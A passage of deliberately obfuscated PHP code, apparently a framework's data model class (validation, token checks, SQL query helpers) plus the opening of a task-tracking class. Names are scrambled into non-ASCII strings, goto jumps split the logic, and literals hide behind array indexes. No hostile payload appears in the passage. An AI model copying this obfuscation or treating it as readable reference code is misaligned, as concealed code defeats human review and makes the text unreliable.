$Fä÷ª…¿¸) { if (!in_array($CÚõñÅà¼, $c¢Áôë’ğ)) { unset($eêİ¤¶ÆÏ[$CÚõñÅà¼]); } elseif (MAGIC_QUOTES_GPC && is_string($Fä÷ª…¿¸)) { $eêİ¤¶ÆÏ[$CÚõñÅà¼] = stripslashes($Fä÷ª…¿¸); } } } $this->autoOperation($eêİ¤¶ÆÏ, $aï¿–‹‡Œ); $this->data = $eêİ¤¶ÆÏ; goto c¯ğ‘áàÕ; AÆÍÀ£Ñó: $Bçßš•¹ º =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($eêİ¤¶ÆÏ)) { $eêİ¤¶ÆÏ = $_POST; } elseif (is_object($eêİ¤¶ÆÏ)) { $eêİ¤¶ÆÏ = get_object_vars($eêİ¤¶ÆÏ); } if (empty($eêİ¤¶ÆÏ) || !is_array($eêİ¤¶ÆÏ)) { $this->error = think_lang($Bçßš•¹ º[269]); return !1; } goto f²£¨‡ğêø; c¯ğ‘áàÕ: return $eêİ¤¶ÆÏ; goto cå¶õ ò§®; aœ …ó‚‡: if (isset($c¢Áôë’ğ)) { if (is_string($c¢Áôë’ğ)) { $c¢Áôë’ğ = explode($Bçßš•¹ º[47], $c¢Áôë’ğ); } if (think_config($Bçßš•¹ º[296])) { $c¢Áôë’ğ[] = think_config($Bçßš•¹ º[297]); } foreach ($eêİ¤¶ÆÏ as $CÚõñÅà¼ => $Fä÷ª…¿¸) { if (!in_array($CÚõñÅà¼, $c¢Áôë’ğ)) { unset($eêİ¤¶ÆÏ[$CÚõñÅà¼]); } } } if (!$this->autoValidation($eêİ¤¶ÆÏ, $aï¿–‹‡Œ)) { return !1; } if (!$this->autoCheckToken($eêİ¤¶ÆÏ)) { $this->error = think_lang($Bçßš•¹ º[298]); return !1; } goto eŒ†ïŠä»; cå¶õ ò§®: } public function autoCheckToken($eãğ“Õ«¡À) { $Bõ†¬øˆİ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (isset($this->options[$Bõ†¬øˆİ[299]]) && !$this->options[$Bõ†¬øˆİ[299]]) { return !0; } if (think_config($Bõ†¬øˆİ[296])) { $C™Ô»æ¾†Š = think_config($Bõ†¬øˆİ[297]); if (!isset($eãğ“Õ«¡À[$C™Ô»æ¾†Š]) || Session::get($C™Ô»æ¾†Š)) { return !1; } list($F»¿™ˆ‹Ó‚, $b™‰†ˆ‘Õİ) = explode($Bõ†¬øˆİ[71], $eãğ“Õ«¡À[$C™Ô»æ¾†Š]); if ($b™‰†ˆ‘Õİ && Session::get($C™Ô»æ¾†Š . $Bõ†¬øˆİ[95] . $F»¿™ˆ‹Ó‚) === $b™‰†ˆ‘Õİ) { Session::remove($C™Ô»æ¾†Š . $Bõ†¬øˆİ[95] . $F»¿™ˆ‹Ó‚); return !0; } if (think_config($Bõ†¬øˆİ[300])) { Session::remove($C™Ô»æ¾†Š . $Bõ†¬øˆİ[95] . $F»¿™ˆ‹Ó‚); } return !1; } return !0; } public function regex($BÂ“õòâ“„, $d¢Ëº¨Ôª) { $CÁÁòëñ =& $_SERVER[ÒÆ›ÆØÎ¾]; $BĞÂÓíâÇ = array($CÁÁòëñ[301] => $CÁÁòëñ[302], $CÁÁòëñ[303] => $CÁÁòëñ[304], $CÁÁòëñ[305] => $CÁÁòëñ[306], $CÁÁòëñ[307] => $CÁÁòëñ[308], $CÁÁòëñ[309] => $CÁÁòëñ[310], $CÁÁòëñ[311] => $CÁÁòëñ[312], $CÁÁòëñ[313] => $CÁÁòëñ[314], $CÁÁòëñ[288] => $CÁÁòëñ[315], $CÁÁòëñ[316] => $CÁÁòëñ[317]); if (isset($BĞÂÓíâÇ[strtolower($d¢Ëº¨Ôª)])) { $d¢Ëº¨Ôª = $BĞÂÓíâÇ[strtolower($d¢Ëº¨Ôª)]; } return preg_match($d¢Ëº¨Ôª, $BÂ“õòâ“„) === 1; } private function autoOperation(&$d©õ¼Ù¿›, $FÀ‚æê¸áˆ) { $FçÕ´±Â¥’ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!empty($this->options[$FçÕ´±Â¥’[318]])) { $f—’×ƒÙò¨ = $this->options[$FçÕ´±Â¥’[318]]; unset($this->options[$FçÕ´±Â¥’[318]]); } elseif (!empty($this->_auto)) { $f—’×ƒÙò¨ = $this->_auto; } if (isset($f—’×ƒÙò¨)) { foreach ($f—’×ƒÙò¨ as $B¨œˆ»šñ) { if (empty($B¨œˆ»šñ[2])) { $B¨œˆ»šñ[2] = THINK_MODEL_INSERT; } if ($FÀ‚æê¸áˆ == $B¨œˆ»šñ[2] || $B¨œˆ»šñ[2] == THINK_MODEL_BOTH) { switch (trim($B¨œˆ»šñ[3])) { case $FçÕ´±Â¥’[319]: case $FçÕ´±Â¥’[320]: $B—ÏŒÀô† = isset($B¨œˆ»šñ[4]) ? (array) $B¨œˆ»šñ[4] : array(); if (isset($d©õ¼Ù¿›[$B¨œˆ»šñ[0]])) { array_unshift($B—ÏŒÀô†, $d©õ¼Ù¿›[$B¨œˆ»šñ[0]]); } if ($FçÕ´±Â¥’[319] == $B¨œˆ»šñ[3]) { $d©õ¼Ù¿›[$B¨œˆ»šñ[0]] = call_user_func_array($B¨œˆ»šñ[1], $B—ÏŒÀô†); } else { $d©õ¼Ù¿›[$B¨œˆ»šñ[0]] = call_user_func_array(array(&$this, $B¨œˆ»šñ[1]), $B—ÏŒÀô†); } break; case $FçÕ´±Â¥’[271]: $d©õ¼Ù¿›[$B¨œˆ»šñ[0]] = $d©õ¼Ù¿›[$B¨œˆ»šñ[1]]; break; case $FçÕ´±Â¥’[321]: if ($FçÕ´±Â¥’[33] === $d©õ¼Ù¿›[$B¨œˆ»šñ[0]]) { unset($d©õ¼Ù¿›[$B¨œˆ»šñ[0]]); } break; case $FçÕ´±Â¥’[322]: default: $d©õ¼Ù¿›[$B¨œˆ»šñ[0]] = $B¨œˆ»šñ[1]; } if (!1 === $d©õ¼Ù¿›[$B¨œˆ»šñ[0]]) { unset($d©õ¼Ù¿›[$B¨œˆ»šñ[0]]); } } } } return $d©õ¼Ù¿›; } protected function autoValidation($D¼«ïñ÷Åï, $E¼Ù éˆ) { $B ÌÔÒ¼†® =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!empty($this->options[$B ÌÔÒ¼†®[323]])) { $B‘Ãá‚©« = $this->options[$B ÌÔÒ¼†®[323]]; unset($this->options[$B ÌÔÒ¼†®[323]]); } elseif (!empty($this->_validate)) { $B‘Ãá‚©« = $this->_validate; } if (isset($B‘Ãá‚©«)) { if ($this->patchValidate) { $this->error = array(); } foreach ($B‘Ãá‚©« as $cšÖ ŞŒ—¶ => $f××ôì¦Å) { if (empty($f××ôì¦Å[5]) || $f××ôì¦Å[5] == THINK_MODEL_BOTH || $f××ôì¦Å[5] == $E¼Ù éˆ) { if (0 == strpos($f××ôì¦Å[2], $B ÌÔÒ¼†®[324]) && strpos($f××ôì¦Å[2], $B ÌÔÒ¼†®[325])) { $f××ôì¦Å[2] = think_lang(substr($f××ôì¦Å[2], 2, -1)); } $f××ôì¦Å[3] = isset($f××ôì¦Å[3]) ? $f××ôì¦Å[3] : THINK_EXISTS_VALIDATE; $f××ôì¦Å[4] = isset($f××ôì¦Å[4]) ? $f××ôì¦Å[4] : $B ÌÔÒ¼†®[326]; switch ($f××ôì¦Å[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($D¼«ïñ÷Åï, $f××ôì¦Å)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($B ÌÔÒ¼†®[33] != trim($D¼«ïñ÷Åï[$f××ôì¦Å[0]])) { if (!1 === $this->_validationField($D¼«ïñ÷Åï, $f××ôì¦Å)) { return !1; } } break; default: if (isset($D¼«ïñ÷Åï[$f××ôì¦Å[0]])) { if (!1 === $this->_validationField($D¼«ïñ÷Åï, $f××ôì¦Å)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Fî‚«„À²ğ, $aÇ¶øª×¤‹) { if (!1 === $this->_validationFieldItem($Fî‚«„À²ğ, $aÇ¶øª×¤‹)) { if ($this->patchValidate) { $this->error[$aÇ¶øª×¤‹[0]] = $aÇ¶øª×¤‹[2]; } else { $this->error = $aÇ¶øª×¤‹[2]; return !1; } } return; } protected function _validationFieldItem($fÌŠôÙç…, $CÄ´Ó»†½à) { $C„äĞ»±ù =& $_SERVER[ÒÆ›ÆØÎ¾]; switch (strtolower(trim($CÄ´Ó»†½à[4]))) { case $C„äĞ»±ù[319]: case $C„äĞ»±ù[320]: $fíŠ·ïè¯í = isset($CÄ´Ó»†½à[6]) ? (array) $CÄ´Ó»†½à[6] : array(); if (is_string($CÄ´Ó»†½à[0]) && strpos($CÄ´Ó»†½à[0], $C„äĞ»±ù[47])) { $CÄ´Ó»†½à[0] = explode($C„äĞ»±ù[47], $CÄ´Ó»†½à[0]); } if (is_array($CÄ´Ó»†½à[0])) { foreach ($CÄ´Ó»†½à[0] as $eÚ·¨Ô—„‹) { $dÌº³¬„ìÊ[$eÚ·¨Ô—„‹] = $fÌŠôÙç…[$eÚ·¨Ô—„‹]; } array_unshift($fíŠ·ïè¯í, $dÌº³¬„ìÊ); } else { array_unshift($fíŠ·ïè¯í, $fÌŠôÙç…[$CÄ´Ó»†½à[0]]); } if ($C„äĞ»±ù[319] == $CÄ´Ó»†½à[4]) { return call_user_func_array($CÄ´Ó»†½à[1], $fíŠ·ïè¯í); } else { return call_user_func_array(array(&$this, $CÄ´Ó»†½à[1]), $fíŠ·ïè¯í); } case $C„äĞ»±ù[327]: return $fÌŠôÙç…[$CÄ´Ó»†½à[0]] == $fÌŠôÙç…[$CÄ´Ó»†½à[1]]; case $C„äĞ»±ù[328]: if (is_string($CÄ´Ó»†½à[0]) && strpos($CÄ´Ó»†½à[0], $C„äĞ»±ù[47])) { $CÄ´Ó»†½à[0] = explode($C„äĞ»±ù[47], $CÄ´Ó»†½à[0]); } $C®†½ß“¨ = array(); if (is_array($CÄ´Ó»†½à[0])) { foreach ($CÄ´Ó»†½à[0] as $eÚ·¨Ô—„‹) { $C®†½ß“¨[$eÚ·¨Ô—„‹] = $fÌŠôÙç…[$eÚ·¨Ô—„‹]; } } else { $C®†½ß“¨[$CÄ´Ó»†½à[0]] = $fÌŠôÙç…[$CÄ´Ó»†½à[0]]; } if (!empty($fÌŠôÙç…[$this->getPk()])) { $C®†½ß“¨[$this->getPk()] = array($C„äĞ»±ù[329], $fÌŠôÙç…[$this->getPk()]); } if ($this->where($C®†½ß“¨)->find()) { return !1; } return !0; default: return $this->check($fÌŠôÙç…[$CÄ´Ó»†½à[0]], $CÄ´Ó»†½à[1], $CÄ´Ó»†½à[4]); } } public function check($AÖïµ˜Ü•, $CÎâòÍ­ëª, $EÏÇšô×‰³ = "\x72\x65\x67\145\x78") { $BôÇğ”…· =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÏÇšô×‰³ = strtolower(trim($EÏÇšô×‰³)); switch ($EÏÇšô×‰³) { case $BôÇğ”…·[7]: case $BôÇğ”…·[330]: $DŠßØÁ¢İ™ = is_array($CÎâòÍ­ëª) ? $CÎâòÍ­ëª : explode($BôÇğ”…·[47], $CÎâòÍ­ëª); return $EÏÇšô×‰³ == $BôÇğ”…·[7] ? in_array($AÖïµ˜Ü•, $DŠßØÁ¢İ™) : !in_array($AÖïµ˜Ü•, $DŠßØÁ¢İ™); case $BôÇğ”…·[331]: case $BôÇğ”…·[332]: if (is_array($CÎâòÍ­ëª)) { $F§ºöó¯À– = $CÎâòÍ­ëª[0]; $B¿òˆ¡Ò‡½ = $CÎâòÍ­ëª[1]; } else { list($F§ºöó¯À–, $B¿òˆ¡Ò‡½) = explode($BôÇğ”…·[47], $CÎâòÍ­ëª); } return $EÏÇšô×‰³ == $BôÇğ”…·[331] ? $AÖïµ˜Ü• >= $F§ºöó¯À– && $AÖïµ˜Ü• <= $B¿òˆ¡Ò‡½ : $AÖïµ˜Ü• < $F§ºöó¯À– || $AÖïµ˜Ü• > $B¿òˆ¡Ò‡½; case $BôÇğ”…·[333]: case $BôÇğ”…·[334]: return $EÏÇšô×‰³ == $BôÇğ”…·[333] ? $AÖïµ˜Ü• == $CÎâòÍ­ëª : $AÖïµ˜Ü• != $CÎâòÍ­ëª; case $BôÇğ”…·[335]: $FÈíçÏŒêÈ = mb_strlen($AÖïµ˜Ü•, $BôÇğ”…·[336]); if (strpos($CÎâòÍ­ëª, $BôÇğ”…·[47])) { list($F§ºöó¯À–, $B¿òˆ¡Ò‡½) = explode($BôÇğ”…·[47], $CÎâòÍ­ëª); return $FÈíçÏŒêÈ >= $F§ºöó¯À– && $FÈíçÏŒêÈ <= $B¿òˆ¡Ò‡½; } else { return $FÈíçÏŒêÈ == $CÎâòÍ­ëª; } case $BôÇğ”…·[337]: list($dˆ—õŠ¢„Ğ, $D®Å˜’òº) = explode($BôÇğ”…·[47], $CÎâòÍ­ëª); if (!is_numeric($dˆ—õŠ¢„Ğ)) { $dˆ—õŠ¢„Ğ = strtotime($dˆ—õŠ¢„Ğ); } if (!is_numeric($D®Å˜’òº)) { $D®Å˜’òº = strtotime($D®Å˜’òº); } return NOW_TIME >= $dˆ—õŠ¢„Ğ && NOW_TIME <= $D®Å˜’òº; case $BôÇğ”…·[338]: return in_array(get_client_ip(), explode($BôÇğ”…·[47], $CÎâòÍ­ëª)); case $BôÇğ”…·[339]: return !in_array(get_client_ip(), explode($BôÇğ”…·[47], $CÎâòÍ­ëª)); case $BôÇğ”…·[326]: default: return $this->regex($AÖïµ˜Ü•, $CÎâòÍ­ëª); } } public function query($DëóéŞ¥×½, $Bñïë¾ØÅ¤ = false) { $dÚÀå•÷ã— =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!is_bool($Bñïë¾ØÅ¤) && !is_array($Bñïë¾ØÅ¤)) { $Bñïë¾ØÅ¤ = func_get_args(); array_shift($Bñïë¾ØÅ¤); } $DëóéŞ¥×½ = str_replace(array($dÚÀå•÷ã—[229], $dÚÀå•÷ã—[340]), $dÚÀå•÷ã—[50], $DëóéŞ¥×½); $DëóéŞ¥×½ = $this->parseSql($DëóéŞ¥×½, $Bñïë¾ØÅ¤); return $this->db->query($DëóéŞ¥×½); } public function execute($d ¨ê‚Æï, $F¬µ‹Ãæê“ = false) { if (!is_bool($F¬µ‹Ãæê“) && !is_array($F¬µ‹Ãæê“)) { $F¬µ‹Ãæê“ = func_get_args(); array_shift($F¬µ‹Ãæê“); } $d ¨ê‚Æï = $this->parseSql($d ¨ê‚Æï, $F¬µ‹Ãæê“); return $this->db->execute($d ¨ê‚Æï); } protected function parseSql($EÑ÷ğ©ŞŒ, $dôÎ˜ÎÂÅ) { $EƒŒ¸‘Œ‘Û =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!0 === $dôÎ˜ÎÂÅ) { $eËÎ—ÙÌ‚î = $this->_parseOptions(); $EÑ÷ğ©ŞŒ = $this->db->parseSql($EÑ÷ğ©ŞŒ, $eËÎ—ÙÌ‚î); } elseif (is_array($dôÎ˜ÎÂÅ)) { $dôÎ˜ÎÂÅ = array_map(array($this->db, $EƒŒ¸‘Œ‘Û[341]), $dôÎ˜ÎÂÅ); $EÑ÷ğ©ŞŒ = vsprintf($EÑ÷ğ©ŞŒ, $dôÎ˜ÎÂÅ); } else { $EÑ÷ğ©ŞŒ = strtr($EÑ÷ğ©ŞŒ, array($EƒŒ¸‘Œ‘Û[342] => $this->getTableName(), $EƒŒ¸‘Œ‘Û[343] => think_config($EƒŒ¸‘Œ‘Û[242]))); } $this->db->setModel($this->name); return $EÑ÷ğ©ŞŒ; } public function db($d²”¶Á–®¤ = '', $B±Çà™ = '', $Cá©ÜÂµï‰ = array()) { goto fÆ¶‚šŠêÕ; fÆ¶‚šŠêÕ: $dÔÆ×àñÅ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($dÔÆ×àñÅ[33] === $d²”¶Á–®¤ && $this->db) { return $this->db; } static $FåŞ¸æº°‹ = array(); goto c„ ­Šêˆõ; c„ ­Šêˆõ: static $EøØ¤çå = array(); if (!isset($EøØ¤çå[$d²”¶Á–®¤]) || isset($EøØ¤çå[$d²”¶Á–®¤]) && $B±Çà™ && $FåŞ¸æº°‹[$d²”¶Á–®¤] != $B±Çà™) { if (!empty($B±Çà™) && is_string($B±Çà™) && !1 === strpos($B±Çà™, $dÔÆ×àñÅ[8])) { $B±Çà™ = think_config($B±Çà™); } $EøØ¤çå[$d²”¶Á–®¤] = Db::getInstance($B±Çà™); } elseif (NULL === $B±Çà™) { $EøØ¤çå[$d²”¶Á–®¤]->close(); unset($EøØ¤çå[$d²”¶Á–®¤]); return; } if (!empty($Cá©ÜÂµï‰)) { if (is_string($Cá©ÜÂµï‰)) { parse_str($Cá©ÜÂµï‰, $Cá©ÜÂµï‰); } foreach ($Cá©ÜÂµï‰ as $DÔ¹’¤´ó => $eÌì†ìëµ) { $this->setProperty($DÔ¹’¤´ó, $eÌì†ìëµ); } } goto EÖ¤ÊØå¸¾; eˆ»–¥ î¡: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto f‡çà—¤åŠ; EÖ¤ÊØå¸¾: $FåŞ¸æº°‹[$d²”¶Á–®¤] = $B±Çà™; $this->db = $EøØ¤çå[$d²”¶Á–®¤]; $this->_after_db(); goto eˆ»–¥ î¡; f‡çà—¤åŠ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $FÎ‰Ğ†œ‚‚ = get_class($this); if ($FÎ‰Ğ†œ‚‚ == $_SERVER[ÒÆ›ÆØÎ¾][344]) { return $this->name; } $this->name = substr($FÎ‰Ğ†œ‚‚, 0, -5); } return $this->name; } public function getTableName() { $e³·‡Á‡·Î =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($this->trueTableName)) { $cêãÓ¹¢÷ = !empty($this->tablePrefix) ? $this->tablePrefix : $e³·‡Á‡·Î[33]; if (!empty($this->tableName)) { $cêãÓ¹¢÷ .= $this->tableName; } else { $cêãÓ¹¢÷ .= think_parse_name($this->name); } $this->trueTableName = strtolower($cêãÓ¹¢÷); } return (!empty($this->dbName) ? $this->dbName . $e³·‡Á‡·Î[95] : $e³·‡Á‡·Î[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $FÙ¦ëéÄîê =& $_SERVER[ÒÆ›ÆØÎ¾]; return isset($this->fields[$FÙ¦ëéÄîê[249]]) ? $this->fields[$FÙ¦ëéÄîê[249]] : $this->pk; } public function getDbFields() { $cŠ¯¤Ò”Ò‚ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (isset($this->options[$cŠ¯¤Ò”Ò‚[277]])) { $DóÅš»•Ò = $this->db->getFields($this->options[$cŠ¯¤Ò”Ò‚[277]]); return $DóÅš»•Ò ? array_keys($DóÅš»•Ò) : !1; } if ($this->fields) { $DóÅš»•Ò = $this->fields; unset($DóÅš»•Ò[$cŠ¯¤Ò”Ò‚[248]], $DóÅš»•Ò[$cŠ¯¤Ò”Ò‚[249]], $DóÅš»•Ò[$cŠ¯¤Ò”Ò‚[250]], $DóÅš»•Ò[$cŠ¯¤Ò”Ò‚[247]]); return $DóÅš»•Ò; } return !1; } public function data($f‰êÏª¢è = '') { $CÍêÌ‰†æÑ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($CÍêÌ‰†æÑ[33] === $f‰êÏª¢è && !empty($this->data)) { return $this->data; } if (is_object($f‰êÏª¢è)) { $f‰êÏª¢è = get_object_vars($f‰êÏª¢è); } elseif (is_string($f‰êÏª¢è)) { parse_str($f‰êÏª¢è, $f‰êÏª¢è); } elseif (!is_array($f‰êÏª¢è)) { think_exception(think_lang($CÍêÌ‰†æÑ[269])); } $this->data = $f‰êÏª¢è; return $this; } public function join($B¦­ ìÓ“) { $AÏéøºøÏÃ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_array($B¦­ ìÓ“)) { $this->options[$AÏéøºøÏÃ[280]] = $B¦­ ìÓ“; } elseif (!empty($B¦­ ìÓ“)) { $this->options[$AÏéøºøÏÃ[280]][] = $B¦­ ìÓ“; } return $this; } public function union($f¨íÔ×İÊÃ, $a·½«öî½ƒ = false) { goto cóì§ëÈã…; d¶ãàÊ¬ğ”: if (is_object($f¨íÔ×İÊÃ)) { $f¨íÔ×İÊÃ = get_object_vars($f¨íÔ×İÊÃ); } if (is_string($f¨íÔ×İÊÃ)) { $e÷¢¸ÉŒÎ¥ = $f¨íÔ×İÊÃ; } elseif (is_array($f¨íÔ×İÊÃ)) { if (isset($f¨íÔ×İÊÃ[0])) { $this->options[$B…ŒÌá…ˆİ[345]] = array_merge($this->options[$B…ŒÌá…ˆİ[345]], $f¨íÔ×İÊÃ); return $this; } else { $e÷¢¸ÉŒÎ¥ = $f¨íÔ×İÊÃ; } } else { think_exception(think_lang($B…ŒÌá…ˆİ[269])); } $this->options[$B…ŒÌá…ˆİ[345]][] = $e÷¢¸ÉŒÎ¥; goto E¬—ÍÅŒšİ; cóì§ëÈã…: $B…ŒÌá…ˆİ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($f¨íÔ×İÊÃ)) { return $this; } if ($a·½«öî½ƒ) { $this->options[$B…ŒÌá…ˆİ[345]][$B…ŒÌá…ˆİ[346]] = !0; } goto d¶ãàÊ¬ğ”; E¬—ÍÅŒšİ: return $this; goto aÚùñ´ÃîÔ; aÚùñ´ÃîÔ: } public function cache($aêñ—áµèÃ = true, $EßÇËà¶ˆÅ = null, $EÕÒÌ±Ê‹¿ = '') { $eìÏ”ï¿ª =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!1 !== $aêñ—áµèÃ) { $this->options[$eìÏ”ï¿ª[347]] = array($eìÏ”ï¿ª[93] => $aêñ—áµèÃ, $eìÏ”ï¿ª[337] => $EßÇËà¶ˆÅ, $eìÏ”ï¿ª[29] => $EÕÒÌ±Ê‹¿); } return $this; } public function field($döº„Ûˆ§, $aŒ°¢¬×ÓÜ = false) { $BƒêåÚ¦Â  =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!0 === $döº„Ûˆ§) { $fÉ†Œ³† Ä = $this->getDbFields(); $döº„Ûˆ§ = $fÉ†Œ³† Ä ? $fÉ†Œ³† Ä : $BƒêåÚ¦Â [182]; } elseif ($aŒ°¢¬×ÓÜ) { if (is_string($döº„Ûˆ§)) { $döº„Ûˆ§ = explode($BƒêåÚ¦Â [47], $döº„Ûˆ§); } $fÉ†Œ³† Ä = $this->getDbFields(); $döº„Ûˆ§ = $fÉ†Œ³† Ä ? array_diff($fÉ†Œ³† Ä, $döº„Ûˆ§) : $döº„Ûˆ§; } $this->options[$BƒêåÚ¦Â [271]] = $döº„Ûˆ§; return $this; } public function scope($FòŒÈ‘ë˜ = '', $Dï½™í˜ˆ = NULL) { $D¿İÔ…Ë° =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($D¿İÔ…Ë°[33] === $FòŒÈ‘ë˜) { if (isset($this->_scope[$D¿İÔ…Ë°[34]])) { $aôˆ©ëÖ–ˆ = $this->_scope[$D¿İÔ…Ë°[34]]; } else { return $this; } } elseif (is_string($FòŒÈ‘ë˜)) { $F­‹ÒÓÜ°â = explode($D¿İÔ…Ë°[47], $FòŒÈ‘ë˜); $aôˆ©ëÖ–ˆ = array(); foreach ($F­‹ÒÓÜ°â as $déñ‡ƒÍŠö) { if (!isset($this->_scope[$déñ‡ƒÍŠö])) { continue; } $aôˆ©ëÖ–ˆ = array_merge($aôˆ©ëÖ–ˆ, $this->_scope[$déñ‡ƒÍŠö]); } if (!empty($Dï½™í˜ˆ) && is_array($Dï½™í˜ˆ)) { $aôˆ©ëÖ–ˆ = array_merge($aôˆ©ëÖ–ˆ, $Dï½™í˜ˆ); } } elseif (is_array($FòŒÈ‘ë˜)) { $aôˆ©ëÖ–ˆ = $FòŒÈ‘ë˜; } if (is_array($aôˆ©ëÖ–ˆ) && !empty($aôˆ©ëÖ–ˆ)) { $this->options = array_merge($this->options, array_change_key_case($aôˆ©ëÖ–ˆ)); } return $this; } public function where($BŒÊ×ÄØÌ, $c·èÕÜÕø = null) { $fÉÃë’Øâ„ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!is_null($c·èÕÜÕø) && is_string($BŒÊ×ÄØÌ)) { if (!is_array($c·èÕÜÕø)) { $c·èÕÜÕø = func_get_args(); array_shift($c·èÕÜÕø); } $c·èÕÜÕø = array_map(array($this->db, $fÉÃë’Øâ„[341]), $c·èÕÜÕø); $BŒÊ×ÄØÌ = vsprintf($BŒÊ×ÄØÌ, $c·èÕÜÕø); } elseif (is_object($BŒÊ×ÄØÌ)) { $BŒÊ×ÄØÌ = get_object_vars($BŒÊ×ÄØÌ); } elseif (is_array($BŒÊ×ÄØÌ)) { foreach ($BŒÊ×ÄØÌ as $AíÉ¹‚ÚÔÊ => $c–›±åä²â) { if ((is_numeric($AíÉ¹‚ÚÔÊ) || !$AíÉ¹‚ÚÔÊ) && is_string($c–›±åä²â)) { if (strpos($c–›±åä²â, $fÉÃë’Øâ„[348]) === 0) { continue; } think_trace($fÉÃë’Øâ„[349], $fÉÃë’Øâ„[33], $fÉÃë’Øâ„[46]); die; } } } if (is_string($BŒÊ×ÄØÌ) && $fÉÃë’Øâ„[33] != $BŒÊ×ÄØÌ) { $c©®Ôò„¿± = array(); $c©®Ôò„¿±[$fÉÃë’Øâ„[350]] = $BŒÊ×ÄØÌ; $BŒÊ×ÄØÌ = $c©®Ôò„¿±; } if (isset($this->options[$fÉÃë’Øâ„[273]])) { $this->options[$fÉÃë’Øâ„[273]] = array_merge($this->options[$fÉÃë’Øâ„[273]], $BŒÊ×ÄØÌ); } else { $this->options[$fÉÃë’Øâ„[273]] = $BŒÊ×ÄØÌ; } return $this; } public function limit($c‘ŞØÆ·Éç, $EÏšéŠ¯¾ = null) { $c™ñßµË»© =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->options[$c™ñßµË»©[290]] = is_null($EÏšéŠ¯¾) ? $c‘ŞØÆ·Éç : $c‘ŞØÆ·Éç . $c™ñßµË»©[47] . $EÏšéŠ¯¾; return $this; } public function page($fŞ±Ï¹âˆ, $fé•š‡¡ = null) { $a¯¡¡ÁÛõ› =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->options[$a¯¡¡ÁÛõ›[351]] = is_null($fé•š‡¡) ? $fŞ±Ï¹âˆ : $fŞ±Ï¹âˆ . $a¯¡¡ÁÛõ›[47] . $fé•š‡¡; return $this; } public function comment($câ­¨‘šÈ) { $this->options[$_SERVER[ÒÆ›ÆØÎ¾][352]] = $câ­¨‘šÈ; return $this; } public function setProperty($dºÇ¶Ğš‰õ, $D°œ¹æ‰İ­) { if (property_exists($this, $dºÇ¶Ğš‰õ)) { $this->{$dºÇ¶Ğš‰õ} = $D°œ¹æ‰İ­; } return $this; } } goto CÓ’§åéÅ ; cº´Çõƒº¹: class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\x72\165\156\156\x69\x6e\x67"; const STATYS_KILL = "\x6b\151\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($c²É›ªŒŞ¸, $EŠÎéá§ˆ = '', $CìÆÔ‚…öŒ = 0, $AŠ‡é² † = '') { goto eñó¦Ë«; dŞî¸¢ÜÕš: $this->startAfter(); Hook::trigger($Cª”¡¡ç°Ï[1527], $this->task); $this->task[$Cª”¡¡ç°Ï[1520]] = timeFloat(); goto F„•Ğ¸Âã‰; cùŒ‰Ğ “¹: $GLOBALS[$Cª”¡¡ç°Ï[1523]] = 1; Hook::bind($Cª”¡¡ç°Ï[1483], array($this, $Cª”¡¡ç°Ï[1524])); Hook::bind($Cª”¡¡ç°Ï[1525], array($this, $Cª”¡¡ç°Ï[1526])); goto dŞî¸¢ÜÕš; eñó¦Ë«: $Cª”¡¡ç°Ï =& $_SERVER[ÒÆ›ÆØÎ¾]; if (self::get($c²É›ªŒŞ¸)) { return; } $this->task = array($Cª”¡¡ç°Ï[393] => $c²É›ªŒŞ¸, $Cª”¡¡ç°Ï[1517] => USER_ID, $Cª”¡¡ç°Ï[1423] => $AŠ‡é² †, $Cª”¡¡ç°Ï[29] => $EŠÎéá§ˆ, $Cª”¡¡ç°Ï[1014] => $Cª”¡¡ç°Ï[33], $Cª”¡¡ç°Ï[1012] => $CìÆÔ‚…öŒ, $Cª”¡¡ç°Ï[1027] => 0, $Cª”¡¡ç°Ï[1518] => 0, $Cª”¡¡ç°Ï[1519] => 0, $Cª”¡¡ç°Ï[741] => timeFloat(), $Cª”¡¡ç°Ï[740] => 0, $Cª”¡¡ç°Ï[1520] => 0, $Cª”¡¡ç°Ï[1521] => 0, $Cª”¡¡ç°Ï[1522] => 0, $Cª”¡¡ç°Ï[702] => $Cª”¡¡ç°Ï[1481]); goto cùŒ‰Ğ “¹; F„•Ğ¸Âã‰: } public function end() { goto a™¼•ù¼ğ; DãàÛÓÕ÷Ê: Hook::unbind($BÓ¢Â‹½ ½[1525], array($this, $BÓ¢Â‹½ ½[1526])); $this->endAfter(); $this->task = !1; goto fàÍ»‘ß±Ä; bç‘ïĞÄ÷´: $CÖ¬¶ÎÄË­ = timeFloat() - $this->task[$BÓ¢Â‹½ ½[741]]; self::log($BÓ¢Â‹½ ½[1528] . $this->task[$BÓ¢Â‹½ ½[393]] . $BÓ¢Â‹½ ½[1529] . $CÖ¬¶ÎÄË­ . $BÓ¢Â‹½ ½[1530]); 